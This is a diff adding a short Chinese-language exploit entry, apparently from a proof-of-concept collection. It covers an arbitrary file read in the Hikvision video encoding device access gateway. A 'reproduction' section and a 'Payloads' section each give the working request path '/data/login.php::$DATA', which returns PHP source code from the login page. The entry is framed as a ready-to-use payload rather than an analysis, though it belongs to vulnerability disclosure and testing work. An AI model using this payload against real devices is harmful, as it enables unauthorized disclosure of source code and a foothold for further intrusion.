@@ -1,0 +1,26 @@
+# Hikvision 视频编码设备接入网关 $DATA 任意文件读取
+
+## 漏洞描述
+Hikvision 视频编码设备接入网关存在配置错误特性，特殊后缀请求php文件可读取源码
+
+## 危害等级
+MEDIUM
+
+## 参考链接
+
+## 漏洞复现方法
+登陆页面
+
+![image-20220519174129368](images/202205191741462.png)
+
+POC
+
+```
+/data/login.php::$DATA
+```
+
+
+## Payloads
+```
+/data/login.php::$DATA
+```
